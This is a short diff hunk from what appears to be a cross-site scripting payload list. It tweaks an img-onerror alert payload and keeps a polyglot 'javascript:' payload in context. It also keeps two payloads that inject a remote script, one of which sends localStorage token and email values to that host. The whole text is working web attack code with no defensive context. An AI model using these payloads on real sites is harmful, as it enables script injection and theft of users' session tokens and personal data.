@@ -20,7 +20,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/<
 
 
 // Payloads
-<img src onerror=alert(decodeURIComponent("URL Encoded String"))>
+<img src=1 onerror=alert(decodeURIComponent("URL Encoded String"))>
 <img src=1 onerror="document.head.appendChild(document.createElement('script')).src='http://127.0.0.1/script.js'">
 <img src=1 onerror="document.head.appendChild(document.createElement('script')).src=’http://127.0.0.1/script.js?c='+localStorage.token + localStorage.email">
 
